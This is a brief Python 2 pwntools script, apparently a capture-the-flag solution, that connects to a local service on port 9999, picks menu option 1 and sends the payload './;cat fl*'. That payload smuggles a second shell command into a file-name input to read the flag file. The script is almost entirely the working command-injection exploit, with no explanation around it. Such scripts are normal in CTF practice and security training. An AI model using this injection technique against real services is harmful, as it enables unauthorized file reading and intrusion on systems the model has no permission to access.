#!/usr/bin/env python2
from pwn import *
context(os='linux', arch='i386')
#context.log_level = 'debug'
#r = process('./openfile')
r=remote('127.0.0.1','9999')

try:
	r.sendline("1")
	pl="./;cat fl*"
	r.sendline(pl)
	print  r.recv()
except Exception,e:
	print e



